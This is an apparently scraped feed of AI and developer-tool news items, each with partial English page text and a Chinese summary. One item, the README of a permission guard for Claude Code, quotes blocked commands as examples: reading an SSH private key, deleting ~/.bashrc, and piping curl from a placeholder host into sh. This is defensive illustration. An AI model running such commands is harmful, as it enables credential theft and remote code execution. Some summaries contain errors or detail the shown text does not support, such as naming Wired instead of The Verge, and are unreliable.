title: I was interviewed by an AI bot for a job
content: I was interviewed by an AI bot for a job | The Verge Skip to main content The homepage The Verge The Verge logo. The homepage The Verge The Verge logo. Hamburger Navigation Button Navigation Drawer The Verge The Verge logo. Login / Sign Up close Close Search Subscribe Facebook Threads Instagram Youtube RSS Comments Drawer Comments Loading comments Getting the conversation ready... Featured Videos Close Featured Videos Posts from this topic will be added to your daily email digest and your homepage feed. Follow Follow See All Featured Videos AI Close AI Posts from this topic will be added to your daily email digest and your homepage feed. Follow Follow See All AI Verge Video Close Verge Video Posts from this topic will be added to your daily email digest and your homepage feed. Follow Follow See All Verge Video I was interviewed by an AI bot for a job I couldn’t get past the uncanny valley of looking at an AI avatar listening to my answers. I couldn’t get past the uncanny valley of looking at an AI avatar listening to my answers. by Hayden Field Close Hayden Field Senior AI Reporter Posts from this author will be added to your daily email digest and your homepage feed. Follow Follow See All by Hayden Field Mar 11, 2026, 2:00 PM UTC Link Share Hayden Field Close Hayden Field Posts from this author will be added to your daily email digest and your homepage feed. Follow Follow See All by Hayden Field is The Verge’s senior AI reporter. An AI beat reporter for more than five years, her work has also appeared in CNBC, MIT Technology Review, Wired UK, and other outlets. Millions of people are on the job hunt right now — and for many people, landing a job in the AI era feels more intimidating than ever. That’s why the onset of AI avatars running your job interview via one-on-one video call, asking you questions, and analyzing how well you respond has generated a lot of discussion — and controversy. There are a handful of companies behind the rise in AI-led interviews, like CodeSignal, Humanly, Eightfold, and more. The creators of these AI tools say the benefit is that it allows companies to hear from virtually everyone who applies for a certain role instead of just a small subset, at least when it comes to an intro interview. Some claim that these tools operate with significantly less bias and prejudice because they’re simply analyzing your responses rather than other video cues. But as we’ve covered again and again, a bias-free AI system is an impossible-to-achieve standard, since models are trained on large swaths of the internet, which contain sexism, racism, and other biases. For this video, I tried out three AI interviewers myself for a range of jobs, either ones created for the exercise based on my current position or real jobs currently listed at Vox Media. Some of the platforms felt a lot more natural than others, but no matter what, each time I wished I was talking to a human instead. Watch the video to check out my experience. Follow topics and
title_zh: 我接受了AI机器人面试求职
summary_zh: 《连线》杂志资深AI记者海登·菲尔德亲身体验了由AI虚拟化身主导的求职面试，并分享了她的感受。随着AI技术渗透招聘领域，诸如CodeSignal、Humanly、Eightfold等公司推出的AI面试工具正引发广泛讨论与争议。这些工具通过一对一视频通话，由AI虚拟化身提问并分析求职者的回答，旨在让公司能初步接触几乎所有申请者，而非仅限少数人。，支持者认为，AI面试官能减少人为偏见，因为它们仅分析语言内容，而非视频中的其他暗示。然而，AI系统并非完全无偏见——其模型基于互联网数据训练，可能包含性别歧视、种族主义等社会偏见，难以达到绝对公平的标准。，菲尔德尝试了三种不同的AI面试平台，应聘岗位包括基于其当前职位虚构的练习岗位以及Vox Media的真实职位。她发现，尽管部分平台的交互体验相对自然，但面对AI虚拟化身时仍无法摆脱“恐怖谷”效应——看着AI头像聆听回答令人感到不适。每次面试后，她都更希望对话对象是人类而非机器。，这一体验凸显了AI招聘工具的双面性：在提升效率与覆盖面的同时，也带来了情感互动缺失与潜在偏见问题。随着AI面试日益普及，其技术伦理与用户体验仍需持续审视。

title: Don't post generated/AI-edited comments. HN is for conversation between humans
content: Hacker News Guidelines Hacker News Guidelines What to Submit On-Topic: Anything that good hackers would find interesting. That includes more than hacking and startups. If you had to reduce it to a sentence, the answer might be: anything that gratifies one's intellectual curiosity. Off-Topic: Most stories about politics, or crime, or sports, or celebrities, unless they're evidence of some interesting new phenomenon. If they'd cover it on TV news, it's probably off-topic. In Submissions Please don't do things to make titles stand out, like using uppercase or exclamation points, or saying how great an article is. Please submit the original source. If a post reports on something found on another site, submit the latter. Please don't use HN primarily for promotion. It's ok to post your own stuff part of the time, but the primary use of the site should be for curiosity. If the title includes the name of the site, please take it out, because the site name will be displayed after the link. If the title contains a gratuitous number or number + adjective, we'd appreciate it if you'd crop it. E.g. translate "10 Ways To Do X" to "How To Do X," and "14 Amazing Ys" to "Ys." Exception: when the number is meaningful, e.g. "The 5 Platonic Solids." Otherwise please use the original title, unless it is misleading or linkbait; don't editorialize. If you submit a video or pdf, please warn us by appending [video] or [pdf] to the title. Please don't post on HN to ask or tell us something. Send it to hn@ycombinator.com. Please don't delete and repost. Deletion is for things that shouldn't have been submitted in the first place. Don't solicit upvotes, comments, or submissions. Users should vote and comment when they run across something they personally find interesting—not for promotion. In Comments Be kind. Don't be snarky. Converse curiously; don't cross-examine. Edit out swipes. Comments should get more thoughtful and substantive, not less, as a topic gets more divisive. When disagreeing, please reply to the argument instead of calling names. "That is idiotic; 1 + 1 is 2, not 3" can be shortened to "1 + 1 is 2, not 3." Don't be curmudgeonly. Thoughtful criticism is fine, but please don't be rigidly or generically negative. Don't post generated comments or AI-edited comments. HN is for conversation between humans. Please don't fulminate. Please don't sneer, including at the rest of the community. Please respond to the strongest plausible interpretation of what someone says, not a weaker one that's easier to criticize. Assume good faith. Eschew flamebait. Avoid generic tangents. Omit internet tropes. Please don't post shallow dismissals, especially of other people's work. A good critical comment teaches us something. Please don't use Hacker News for political or ideological battle. It tramples curiosity. Please don't comment on whether someone read an article. "Did you even read the article? It mentions that" can be shortened to "The article mentions that". Please don't
title_zh: 请勿发布生成式/AI编辑的评论。HN是供人类交流的平台。
summary_zh: Hacker News社区指南强调，该平台旨在促进人与人之间的真实对话，因此明确禁止发布由AI生成或编辑的评论。指南详细规定了内容提交与评论行为的标准，以维护社区质量。，在内容提交方面，主题应围绕能激发技术爱好者智力好奇心的内容，涵盖黑客技术、创业及其他广泛领域。政治、犯罪、体育、名人等常见话题通常被视为无关，除非它们展示了某种新颖现象。标题应保持简洁客观，避免使用大写、感叹号或自我宣传性语言，并优先提交原始来源。推广行为不应成为使用该平台的主要目的，用户应基于兴趣分享内容。此外，标题中需去除网站名称，简化冗余数字或形容词（如将“10种X方法”改为“如何实现X”），除非数字本身具有实质意义。若提交视频或PDF文件，须在标题后标注[video]或[pdf]。用户不应通过HN直接联系管理员，而应使用专用邮箱hn@ycombinator.com。同时，禁止删除后重新提交、索取点赞或评论等行为。，在评论规范部分，指南要求用户保持友善与建设性态度，进行深思熟虑的实质性交流。讨论时应针对论点而非人身攻击，避免冷嘲热讽或泛泛而谈的负面评论。特别指出，AI生成或编辑的评论违背了“人类间对话”的核心原则，因此不被允许。此外，用户需避免政治或意识形态争斗、浅薄否定他人成果，以及围绕“是否阅读文章”的无意义争论。社区鼓励基于善意原则的理性互动，以共同维护一个专注技术探索与知识分享的高质量环境。

title: Reliable Software in the LLM Era
content: Reliable Software in the LLM Era Skip to Content Try the Quint LLM Kit for extra help getting started! Home Documentation Introduction Why? What does Quint do? Getting Started Use‑Cases Talks & Podcasts FAQ Writing specifications Language basics Lessons Learn the language with CodeTour Tutorials Hello, World! Booleans Integers Anatomy Sets Cheatsheet ↵ Examples Using specifications Checking Properties Interacting with REPL Literate Specifications Model-based Testing How the tools work Model Checkers Understanding the Simulator Reference Documentation Language Manual CLI Manual Built-in Operators Design & Development Design principles Development Docs Architecture Decision Records (ADRs) Transpiler architecture Errors Visiting IR components Effect System Type System Modules Flattening Managing Apalache Requests for Comments (RFCs) Extend Quint with Row-Polymorphic Sum Types Design Space of Foreign Calls in Quint User Stories Simulator Traces in REPL Choreo What is Choreo? Tutorial Using Cues Custom Effects and Environment Extensions Micro steps Blog Community Community Light Light Reliable Software in the LLM Era November 17, 2025 • Written by: Gabriela Moreira Quint was born from the concern of making software more reliable. This has been Informal Systems’ mission from its conception. We want a world where people can trust the software they use. LLMs have transformed how we write code, but they’ve also created new frustrations. We’ve all been there: staring at a huge AI-generated diff with no clue if it’s actually right. AI fooling us with code that seemed to work but was subtly wrong. Tests that all passed but didn’t actually test anything meaningful. The whole point of LLMs is producing text that looks correct - and that’s exactly what makes validation so hard. AI is overconfident and needs reality checks. But here’s the hopeful part: LLMs also enable us to take care of reliability with a much smaller time investment. And no, this is not simply generating specs. It’s not about “putting AI into Quint”. It’s about how Quint fits in the new world of software development, with the same goal it was born with. Let me tell you how we used Quint to guardrail LLMs and get them to make a significant core change on a complex codebase that we feel confident about. How Quint fits into this story The fundamental challenge with LLMs is validation . LLMs excel at code generation, but we humans struggle to validate correctness through code review alone. We typically use a combination of natural language documentation and code, and both are surprisingly hard to validate. Quint solves this by sitting between English and code as an ideal validation point. It’s more abstract than code, which makes it easier to reason about, yet it’s executable unlike English, which makes it mechanically verifiable. Quint’s tooling - the simulator, model checker, and REPL - lets you build confidence through exploration and property checking. But what about validating the actual code
summary_zh: 在LLM时代构建可靠软件：Quint如何成为AI生成代码的验证基石，Quint语言及其工具套件诞生于提升软件可靠性的核心诉求，这与Inform Systems自创立以来的使命一脉相承。随着LLM彻底改变代码编写方式，它也带来了新的挑战：开发者常面对大量AI生成的代码差异（diff），却难以判断其正确性；AI可能生成看似能运行但存在细微错误的代码；测试全部通过却未验证任何实质逻辑。问题的根源在于，LLM的核心能力是生成“看起来正确”的文本，这恰恰使得验证变得异常困难。，Quint的应对之道是在自然语言描述与具体代码之间建立一个理想的验证点。它比代码更抽象，因而更易于进行逻辑推理；同时它又是可执行的，这一点不同于纯英文描述，从而能够进行机械化验证。Quint并非简单地将AI集成到自身，也不是仅用于生成规范（specs），而是以其诞生之初的同一目标——确保可靠性，来适应软件开发的新范式。，Quint的工具链（包括模拟器、模型检查器和交互式REPL环境）允许开发者通过探索和属性检查来建立信心。其核心价值在于解决LLM时代的根本挑战：验证。LLM擅长生成代码，但人类仅通过代码审查来验证正确性异常困难。Quint通过充当高级规范语言，填补了自然语言文档与可执行代码之间的鸿沟。，一个具体案例展示了Quint如何为LLM设置防护栏（guardrail）：在一个复杂代码库中，团队利用Quint引导LLM进行了一项重大的核心变更，并对此变更抱有高度信心。这体现了Quint在AI辅助开发流程中的实际作用：将LLM的生成能力与形式化验证的严谨性相结合，以可管理的时间成本显著提升软件的可靠性。，总之，Quint通过提供一种既可推理又可验证的抽象语言，成为LLM生成代码的关键验证层，帮助开发者在享受AI编程效率的同时，确保软件行为的正确性与可靠性。

title: Show HN: A context-aware permission guard for Claude Code
content: GitHub - manuelschipper/nah: Context-aware safety guard for Claude Code. A permission system you control. · GitHub Skip to content You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert manuelschipper / nah Public Notifications You must be signed in to change notification settings Fork 4 Star 190 main Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 162 Commits 162 Commits .claude/ commands .claude/ commands assets assets site site src/ nah src/ nah tests tests .gitignore .gitignore CHANGELOG.md CHANGELOG.md CLAUDE.md CLAUDE.md LICENSE LICENSE README.md README.md mkdocs.yml mkdocs.yml pyproject.toml pyproject.toml View all files Repository files navigation A permission system you control. Because allow-or-deny isn't enough. Docs • Install • What it guards • How it works • Configure • CLI The problem Claude Code’s permission system is allow-or-deny per tool, but that doesn’t really scale. Deleting some files is fine sometimes. And git checkout is sometimes catastrophic. Even when you curate permissions, 200 IQ Opus can find a way around it. Maintaining a deny list is a fool’s errand. We needed something like --dangerously-skip-permissions that doesn’t nuke your untracked files, exfiltrate your keys, or install malware. nah classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it. git push — Sure. git push --force — nah? rm -rf __pycache__ — Ok, cleaning up. rm ~/.bashrc — nah. Read ./src/app.py — Go ahead. Read ~/.ssh/id_rsa — nah. Write ./config.yaml — Fine. Write ~/.bashrc with curl sketchy.com | sh — nah. Install pip install nah nah install You are up and running. To uninstall: nah uninstall && pip uninstall nah . Don't use --dangerously-skip-permissions . In bypass mode, hooks fire asynchronously — commands execute before nah can block them. Allow-list Bash , Read , Glob , Grep and let nah guard them. For Write and Edit , your call — nah inspects content either way. Try it out Run the security demo inside Claude Code: /nah-demo You'll go thru 25 live cases across 8 threat categories: remote code execution, data exfiltration, obfuscated commands, and others. Takes ~5 minutes. What it guards nah is a PreToolUse hook that intercepts every tool call before it executes: Tool What nah checks Bash Structural command classification — action type, pipe composition, shell unwrapping Read Sensitive path detection ( ~/.ssh , ~/.aws , .env , ...) Write Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) Edit Path check + project boundary + content inspec
title_zh: Show HN：面向Claude Code的上下文感知权限防护系统
summary_zh: 近日，GitHub上开源了一个名为“nah”的项目，它是一个为Claude Code设计的上下文感知权限防护系统。该项目旨在解决Claude Code现有权限系统仅提供“允许或拒绝”这种粗粒度控制的问题，通过引入更精细、智能的权限管理，让用户能够真正掌控AI助手对系统工具和文件的访问。，核心问题是，Claude Code当前的权限机制是按工具（如Bash、Read、Write）进行全局允许或拒绝，这在实际使用中缺乏灵活性且难以扩展。例如，执行`git push`通常是安全的，但`git push --force`可能具有破坏性；删除缓存文件`__pycache__`可以接受，但删除关键配置文件`~/.bashrc`则非常危险。即使精心配置权限列表，高智能的模型（如Claude Opus）也可能找到绕过方法，单纯维护一个拒绝列表效果有限。，“nah”系统通过一个PreToolUse钩子，在每次工具调用执行前进行实时拦截和评估。其核心功能是根据上下文规则对工具调用进行毫秒级分类和检查：，- 对于Bash命令，它会进行结构分类，分析操作类型、管道组合并进行Shell解包。，- 对于Read操作，它会检测敏感路径（如`~/.ssh`、`~/.aws`、`.env`等）。，- 对于Write和Edit操作，它会检查路径、项目边界，并深入检查内容本身，以识别潜在的密钥泄露、数据外泄或破坏性负载。，对于模糊或难以判断的情况，系统可选地将决策路由给一个LLM进行辅助判断。所有决策都会被记录并可追溯，确保了透明性。，该项目易于安装（通过`pip install nah`后运行`nah install`），并提供了开箱即用的默认配置，同时也支持用户自定义规则。项目文档中强调，用户应避免使用Claude Code自带的`--dangerously-skip-permissions`选项，因为在绕过模式下，命令会在“nah”拦截之前就异步执行，失去保护作用。，为了帮助用户理解其防护能力，项目提供了一个安全演示（在Claude Code中运行`/nah-demo`），该演示会引导用户体验25个涉及8种威胁类别（包括远程代码执行、数据窃取、混淆命令等）的实时案例，整个过程约需5分钟。，总之，“nah”项目为Claude Code用户提供了一个可控、上下文感知且可审计的权限防护层，在提供便利的同时，显著增强了使用AI编程助手时的系统安全性和可控性。

title_zh: Show HN：开源AI智能体浏览器
summary_zh: 开源项目Agent Browser Protocol（ABP）在GitHub上发布，这是一个专为AI智能体设计的浏览器协议。该项目从Chromium分支而来，旨在解决传统网页浏览的连续异步特性与AI智能体基于工具和步骤的离散化思考模式之间的不匹配问题。，ABP的核心功能是将网页导航重新格式化为离散的、多模态的命令序列，使AI智能体能够以更结构化、可预测的方式与网页进行交互。它实现了确定性的浏览器自动化，能够开箱即用地与Claude、Codex、OpenCode等大型语言模型（LLM）协同工作。这意味着开发者可以轻松地将这些AI模型接入一个可控的浏览器环境，执行网页操作、提取信息或进行自动化测试。，该协议的关键价值在于为AI智能体提供了标准化的网页交互接口。通过将复杂的网页内容（如动态元素、JavaScript执行）转化为一系列明确的动作（如点击、输入、滚动）和可解析的响应（如文本、截图、DOM状态），ABP降低了构建可靠网页自动化智能体的难度。其设计强调了确定性和可重复性，这对于基于LLM的智能体完成复杂、多步骤的网络任务至关重要。，项目包含了完整的代码库、构建说明（如BUILD.gn、DEPS）以及详细的文档（README.md、TESTING.md）。目前，该项目已获得284个星标，显示出开发者社区的初步关注。ABP为AI研究与开发提供了一个基础设施层面的工具，有望推动更高级别的网络自动化智能体和RAG（检索增强生成）应用的发展。

title: Preliminary data from a longitudinal AI impact study
content: AI productivity gains are 10%, not 10x - by Justin Reock Subscribe Sign in AI productivity gains are 10%, not 10x Preliminary data from our longitudinal AI impact study. Justin Reock Mar 11, 2026 12 4 Share Welcome to the latest issue of Engineering Enablement, a weekly newsletter sharing research and perspectives on developer productivity. Subscribe 🗓 Join Abi on March 19th for a live Q&A session. He will address some of the more pressing questions we’ve received around measuring AI impact, the impact of tool choice, and more. Register here. Social media and vendor marketing have set high expectations for AI, suggesting as much as 2-3x productivity gains. But from the data we’re seeing, the reality on the ground is far more modest. At DX, we’re currently conducting a longitudinal study to measure the long-term impact of AI adoption on key engineering productivity metrics. As part of this study, we analyzed data from 40 companies between November 2024 through February 2026 to track whether teams are shipping more pull requests as AI adoption increases. We found that, during this time, AI usage increased significantly—by an average 65%. However, PR throughput only increased by 9.97%. Note: This figure is particularly robust because we’ve filtered out potential gamification effects by excluding teams that set PR throughput targets for individual engineers, which could drive metric inflation rather than genuine output. What this means for leaders A ~10% gain is consistent with what we’re hearing from engineering leaders more broadly: most organizations are landing in the 8–12% range. It is a real improvement, but it’s a long way from the 2–3x gains many executives and boards have come to expect. AI is moving the needle, but leaders may need to reset expectations internally. Why gains aren’t higher To understand what’s driving this, we spoke with developers across several of these organizations. The explanation we heard most consistently: writing code was never the bottleneck. As one senior developer put it: “The easy tasks are a little easier. The tedious tasks are a little less annoying. A four-day task might take three. But that doesn’t mean I’m shipping 3x more PRs.” AI may be accelerating the coding portion of the job. But coding represents a relatively small slice of how engineers actually spend their time. Planning, alignment, scoping, code review, and handoffs—the human parts of the SDLC—remain largely untouched. What’s next We’re continuing to investigate the long-term effects of AI in engineering teams. The full study will explore why some teams are capturing more of the upside than others, and what leaders can do to close that gap. More to come. This week’s featured DevProd job openings. See more open roles here . Amplitude is hiring a Engineering Manager, Cloud Platform | San Francisco, CA Figma is hiring a Staff Software Engineer, Developer Experience | Remote; US Plaid is hiring a Software Engineer - Platform | New York, NY UserTesting
title_zh: 一项关于人工智能影响的纵向研究的初步数据
summary_zh: 根据DX公司正在进行的一项纵向AI影响研究的初步数据，现实中的AI生产力提升幅度远低于社交媒体和供应商营销所宣传的水平。该研究分析了2024年11月至2026年2月期间40家公司的数据，旨在追踪AI采用率的提高是否带来了更多的代码拉取请求（PR）产出。，研究发现，在此期间，AI的使用量平均大幅增长了65%，但PR吞吐量仅增长了9.97%。这一数据经过了严谨处理，通过排除为工程师设定PR吞吐量目标的团队，过滤了可能扭曲数据的“游戏化”效应，从而更真实地反映了实际产出增长。，对于企业领导者而言，约10%的增益与更广泛工程领导者反馈的范围（8%-12%）一致。这是一个切实的改进，但距离许多高管和董事会预期的2-3倍增长相去甚远。AI确实在推动进步，但领导者可能需要内部调整期望值。，为何增益没有更高？研究团队通过与多家组织的开发者交流发现，最普遍的解释是：编写代码从来都不是瓶颈所在。正如一位资深开发者所言：“简单任务变得稍微容易，繁琐任务不那么恼人。一个四天的任务可能只需三天。但这并不意味着我能提交3倍的PR。”AI可能加速了工作中的编码环节，但编码只占工程师实际时间的一小部分。规划、协调、范围界定、代码审查和交接——这些软件开发生命周期（SDLC）中需要人际协作的部分——基本未受AI影响。，该研究的下一步将继续深入调查AI在工程团队的长期影响。完整研究将探讨为何有些团队能获得比其他团队更多的效益，以及领导者可以采取哪些措施来缩小这种差距。

title: Launch HN: Sentrial (YC W26) – Catch AI agent failures before your users do
title_zh: 发布 HN：Sentrial（YC W26）——在用户发现之前捕捉 AI 代理故障
summary_zh: Sentrial（YC W26）是一个专注于AI应用监控与故障预防的平台，旨在帮助开发者在用户遇到问题之前主动发现并解决AI代理（AI agent）的故障。随着AI代理在复杂工作流中的广泛应用，其不可预测的失败风险日益凸显，而传统监控工具往往难以捕捉这些非结构化、基于自然语言的错误。，Sentrial的核心功能是实时监控AI代理的执行过程，自动检测异常行为。它通过分析LLM（如GPT、Claude等）的输入、输出以及中间步骤（如工具调用、代码执行），识别出逻辑矛盾、安全漏洞、性能下降或偏离预期的响应。平台采用规则引擎与机器学习相结合的方式，允许团队设置自定义监控规则（例如检测敏感信息泄露、成本超支或功能失效），同时也提供自动化异常检测。，该平台的一个关键特点是支持多种集成方式，包括API、SDK以及与常见开发框架（如LangChain、LlamaIndex）的对接，便于嵌入现有工作流。Sentrial还提供可视化仪表板，展示代理的健康状况、错误趋势和根本原因分析，帮助团队快速定位问题。例如，它可以追踪到某个RAG（检索增强生成）流程因文档检索失败而导致答案不准确，或识别出API调用超时引发的连锁故障。，对于开发者而言，Sentrial的价值在于降低AI应用的运维风险，提升可靠性。它使团队能够设置主动告警，在故障影响用户之前进行干预，同时通过历史数据分析优化代理性能。目前该平台正处于早期阶段，面向AI工程师、产品团队和企业开发者，旨在成为AI应用可观察性领域的基础设施。

title_zh: langflow-ai/openrag - OpenRAG是一个基于Langflow、Docling和Opensearch构建的综合性单包检索增强生成平台。
summary_zh: OpenRAG是一个基于Langflow、Docling和OpenSearch构建的综合性、一体化检索增强生成平台。该项目旨在提供一个开箱即用的RAG解决方案，使用户能够通过AI驱动的智能对话界面进行文档上传、处理和查询。，该平台的核心架构整合了多项关键技术：利用Langflow实现文档摄取、检索工作流和智能引导，提供可视化的拖放式工作流构建器，支持快速迭代；通过Docling处理杂乱的真实世界数据，进行智能解析；后端则依靠OpenSearch提供企业级、可扩展的语义搜索能力，确保生产环境的高性能。，OpenRAG的主要特点包括：一体化封装，所有核心工具预先配置，安装后即可运行；支持智能体驱动的RAG工作流，具备重新排序和多智能体协调等高级编排功能；强大的文档摄取能力，能处理复杂的现实数据；提供模块化的企业附加组件，便于按需扩展功能。，其工作流程经过简化：用户上传文档后，系统自动进行解析、分块和向量化处理，并将其存储到OpenSearch向量数据库中。当用户通过聊天界面提问时，平台会执行语义检索，获取相关上下文，并交由大型语言模型生成准确、基于上下文的回答。，该项目由FastAPI和Next.js技术栈构建，在GitHub上开源，目前已获得大量关注。它为开发者和企业提供了一个功能全面、易于部署的RAG平台，显著降低了构建智能文档搜索与对话系统的门槛。

Hindsight™ is an agent memory system built to create smarter agents that learn over time. Most agent memory systems focus on recalling conversation history. Hindsight is focused on making agents that learn, not just remember. hindsight-learning-demo.mp4 It eliminates the shortcomings of alternative techniques such as RAG and knowledge graph and delivers state-of-the-art performance on long term memory tasks. Memory Performance & Accuracy Hindsight is the most accurate agent memory system ever tested according to benchmark performance. It has achieved state-of-the-art performance on the LongMemEval benchmark, widely used to assess memory system performance across a variety of conversational AI scenarios. The current reported performance of Hindsight and other agent memory solutions as of January 2026 is shown here: The benchmark performance data for Hindsight has been independently reproduced by research collaborators at the Virginia Tech Sanghani Center for Artificial Intelligence and Data Analytics and The Washington Post. Other scores are self-reported by software vendors. Hindsight is being used in production at Fortune 500 enterprises and by a growing number of AI startups. Adding Hindsight to Your AI Agents The easiest way to use Hindsight with
title_zh: vectorize-io/hindsight - Hindsight：具备学习能力的智能体记忆系统
summary_zh: Hindsight是一个旨在创建能够随时间学习的智能体的记忆系统。与大多数专注于回忆对话历史的代理记忆系统不同，Hindsight的核心目标是让智能体具备学习能力，而不仅仅是记忆。它消除了RAG和知识图谱等替代技术的缺点，并在长期记忆任务上提供了最先进的性能。，根据基准测试，Hindsight是迄今为止测试过的最准确的代理记忆系统。它在广泛用于评估各种对话AI场景下记忆系统性能的LongMemEval基准测试中，取得了最先进的性能。截至2026年1月的数据显示，其性能优于其他解决方案。该基准性能数据已由弗吉尼亚理工大学Sanghani人工智能与数据分析中心以及《华盛顿邮报》的研究合作者独立复现，而其他分数则由软件供应商自行报告。，Hindsight目前已在财富500强企业和越来越多的AI初创公司中投入生产使用。其核心价值在于通过持续学习，使AI智能体能够积累和利用经验，从而在长期互动中变得更智能、更高效。项目提供了丰富的资源，包括文档、研究论文、示例教程（Cookbook）以及Hindsight Cloud服务，方便开发者集成和使用。

title_zh: 阿里巴巴/page-agent - JavaScript 页面图形用户界面代理。用自然语言控制网页界面。
summary_zh: 阿里巴巴开源项目 page-agent 是一个基于 JavaScript 的网页内 GUI 智能体，允许用户通过自然语言控制网页界面。该项目旨在简化网页交互，无需依赖浏览器扩展、Python 脚本或无头浏览器，所有操作均在当前网页内通过 JavaScript 完成。，核心功能与特点包括：易于集成，开发者只需在网页中引入一行脚本即可快速部署；采用基于文本的 DOM 操作，无需截图或多模态 LLM，也无需特殊权限；支持用户自带 LLM（如 GPT、Claude 等），并提供了美观的人机交互界面。此外，项目还提供了一个可选的 Chrome 扩展，用于处理跨浏览器标签页的多页面任务。，主要应用场景涵盖：为 SaaS 产品快速嵌入 AI Copilot 功能，无需重写后端；将复杂的多步骤表单填写流程简化为一句自然语言指令，适用于 ERP、CRM 等管理系统；提升网页可访问性，让用户通过自然语言或语音命令操作任何网络应用；以及通过扩展实现跨页面的智能体任务执行。，项目提供了快速入门方式，包括通过 CDN 链接直接引入演示脚本（附有全球和中国镜像），或通过 NPM 安装并调用 PageAgent API 进行编程式集成。开发者需要配置自己的 LLM 模型（如 qwen3.5-plus）、API 基址和密钥来初始化智能体实例，随后即可使用 `execute` 方法执行自然语言指令。，page-agent 强调开源协作，欢迎社区贡献，并提供了详细的使用文档和演示示例。该项目为网页交互自动化提供了一种轻量、灵活且功能强大的解决方案。

It's the only agent with a built-in learning loop — it creates skills from experience, improves them during use, nudges itself to persist knowledge, searches its own past conversations, and builds a deepening model of who you are across sessions. Run it on a $5 VPS, a GPU cluster, or serverless infrastructure that costs nearly nothing when idle. It's not tied to your laptop — talk to it from Telegram while it works on a cloud VM. Use any model you want — Nous Portal , OpenRouter (200+ models), z.ai/GLM , Kimi/Moonshot , MiniMax , OpenAI, or your own endpoint. Switch with hermes model — no code changes, no lock-in. A real terminal interface Full TUI with multiline editing, slash-command autocomplete, conversation history, interrupt-and-redirect, and streaming tool output. Lives where you do Telegram, Discord, Slack, WhatsApp, Signal, and CLI — all from a single gateway process. Voice memo transcription, cross-platform conversation cont
title_zh: NousResearch/hermes-agent - 与你共同成长的智能体
summary_zh: NousResearch在GitHub上开源了Hermes Agent项目，这是一个具备自我进化能力的AI智能体。其核心创新在于内置了持续学习循环机制，能够从交互经验中自主创建技能，并在使用过程中不断优化这些技能。系统会主动提示自身保存关键知识，支持检索过往对话历史，并能跨会话持续构建并深化对用户个性化需求的理解模型。，该智能体设计注重实用性与灵活性，支持在多种基础设施上部署，包括成本低廉的5美元VPS、GPU集群或闲置时成本近乎为零的无服务器架构。它不依赖于本地设备，用户可以通过Telegram等应用与运行在云虚拟机上的智能体进行交互。，在模型支持上，Hermes Agent具有高度的开放性。它兼容包括Nous Portal、OpenRouter（提供超过200个模型）、z.ai/GLM、Kimi/Moonshot、MiniMax、OpenAI在内的多种模型服务，也支持用户自定义的API端点。用户可以通过简单的`hermes model`命令切换模型，无需修改代码，有效避免了供应商锁定。，项目提供了功能完整的终端用户界面（TUI），支持多行编辑、斜杠命令自动补全、对话历史查看、任务中断与重定向以及流式工具输出。其网关进程能够统一接入Telegram、Discord、Slack、WhatsApp、Signal等多种通讯平台及CLI，实现跨平台对话连续性。此外，它还集成了语音备忘录转录等便捷功能。，简而言之，Hermes Agent是一个旨在伴随用户共同成长、可自我改进、且部署与使用高度灵活的AI智能体框架。

title: google-ai-edge/LiteRT - LiteRT, successor to TensorFlow Lite. is Google's On-device framework for high-performance ML & GenAI deployment on edge platforms, via efficient conversion, runtime, and optimization

LiteRT features advanced GPU/NPU acceleration, delivers superior ML & GenAI performance, making on-device ML inference easier than ever. 🌟 What's New 🆕 New LiteRT Compiled Model API : Streamline development with automated accelerator selection, true async execution, and efficient I/O buffer handling. Automated accelerator selection vs explicit delegate creation Async execution for faster overall execution time Easy NPU runtime and model distribution Efficient I/O buffer handling 🤖 Unified NPU Acceleration : Offer seamless access to NPUs from major chipset providers with a consistent developer experience. LiteRT NPU, previously under Early access program is available to all users: https://ai.google.dev/edge/litert/next/npu ⚡ Best-in-class GPU Performance : Use state-of-the-art GPU acceleration for on-device ML. The new buffer interoperabilit
title_zh: 谷歌AI边缘/LiteRT - LiteRT作为TensorFlow Lite的继任者，是谷歌面向边缘平台的设备端高性能机器学习与生成式AI部署框架，通过高效转换、运行时和优化实现。
summary_zh: 谷歌AI团队在GitHub上开源了LiteRT项目，作为TensorFlow Lite的继任者，这是一个专为边缘平台设计的设备端框架，旨在通过高效的转换、运行时和优化技术，实现高性能机器学习和生成式AI的部署。，LiteRT延续了TensorFlow Lite作为可靠、高性能设备端AI运行时的传统。其核心目标是让设备端的ML推理变得比以往更加容易，同时为生成式AI提供强大支持。框架的核心优势在于其先进的计算加速和性能优化能力。，该框架引入了多项关键新特性。首先是全新的LiteRT Compiled Model API，它通过自动化加速器选择、真正的异步执行以及高效的I/O缓冲区处理来简化开发流程。开发者无需再显式创建委托，系统可自动选择最佳加速器；异步执行能缩短整体运行时间；同时，它还简化了NPU运行时和模型分发，并优化了缓冲区管理。，其次，LiteRT提供了统一的NPU加速支持。它能够无缝接入各大芯片供应商的NPU，为开发者提供一致的开发体验。此前处于早期访问计划的LiteRT NPU现已向所有用户开放。，此外，框架具备一流的GPU性能，利用最先进的GPU加速技术来提升设备端ML任务的速度。新的缓冲区互操作性设计进一步增强了效率。，总体而言，LiteRT通过其高效的转换工具、优化的运行时系统以及对多种硬件加速器（GPU/NPU）的统一支持，致力于在资源受限的边缘设备上实现高性能、低延迟的ML和GenAI模型部署，简化开发者的工作流程并提升应用性能。

title: msitarzewski/agency-agents - A complete AI agency at your fingertips - From frontend wizards to Reddit community ninjas, from whimsy injectors to reality checkers. Each agent is a specialized expert with personality, processes, and proven deliverables.
content: GitHub - msitarzewski/agency-agents: A complete AI agency at your fingertips - From frontend wizards to Reddit community ninjas, from whimsy injectors to reality checkers. Each agent is a specialized expert with personality, processes, and proven deliverables. · GitHub Skip to content You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert msitarzewski / agency-agents Public Notifications You must be signed in to change notification settings Fork 5k Star 32.1k main Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 153 Commits 153 Commits .github .github design design engineering engineering examples examples game-development game-development integrations integrations marketing marketing paid-media paid-media product product project-management project-management sales sales scripts scripts spatial-computing spatial-computing specialized specialized strategy strategy support support 